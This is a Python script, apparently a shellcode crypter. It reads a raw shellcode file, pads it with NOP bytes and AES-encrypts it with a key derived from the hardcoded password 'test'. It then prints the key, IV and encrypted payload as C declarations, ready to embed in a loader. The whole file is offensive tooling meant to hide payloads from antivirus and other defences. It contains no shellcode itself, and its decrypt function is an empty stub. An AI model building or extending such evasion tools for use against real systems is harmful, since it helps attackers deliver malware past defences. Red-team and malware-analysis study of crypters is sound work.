import re
import os
import base64
import binascii
import argparse
import mimetypes
from Crypto.Cipher import AES
import pbkdf2

def aes_pad(data):

    bs = AES.block_size
    while (len(data) % bs != 0):
        data += b"\x90"
    
    return data

def get_crypto_data(password: str) -> tuple:
    salt = "\x00" * 16
    key = pbkdf2.PBKDF2(password, salt).read(32)
    iv = pbkdf2.PBKDF2(password, salt).read(16)
    return (key, iv, salt)


def build_c_vars(data: bytes) -> str:
    data = binascii.hexlify(data).decode("utf-8")
    split_data = re.findall("..", data)
    c_data = ""
    for i, b in enumerate(split_data):
        if i == (len(split_data)-1):              
            c_data += f"0x{b}"
        else:
            c_data += f"0x{b},"
    return c_data

def aes_encrypt(data: bytes, key: bytes, iv: bytes):
    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
    encrypted_data = cipher.encrypt(data)
    return base64.b64encode(encrypted_data).decode("utf-8")

def aes_decrypt(data):
    pass


def parse_shellcode(shellcode_file):

    # Check if the file is a binary (RAW) file
    file_type = mimetypes.guess_type(shellcode_file)[0]
    if ("octet-stream" not in file_type):
        print(f"[!] Error: {shellcode_file} does not look to be a RAW Binary file")
        exit(1)

    with open(shellcode_file, "rb") as f:
        data = f.read()
    return data


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--shellcode_file", metavar='', dest="sc_file", required=True, help="Path to RAW shellcode file")
    args = parser.parse_args()

    key, iv, salt = get_crypto_data("test")
    print(binascii.hexlify(key).decode("utf-8"))
    print(binascii.hexlify(iv).decode("utf-8"))
    c_key ="uint8_t key[32] = {%s};" % build_c_vars(key)
    c_iv ="uint8_t iv[16] = {%s};" % build_c_vars(iv)
    print(c_key)
    print(c_iv)

    raw_shellcode = parse_shellcode(args.sc_file)
    raw_padded_shellcode = aes_pad(raw_shellcode)
    encrypted_encoded_shellcode = aes_encrypt(raw_padded_shellcode, key, iv)

    print(f"shellcode = \"{encrypted_encoded_shellcode}\";")
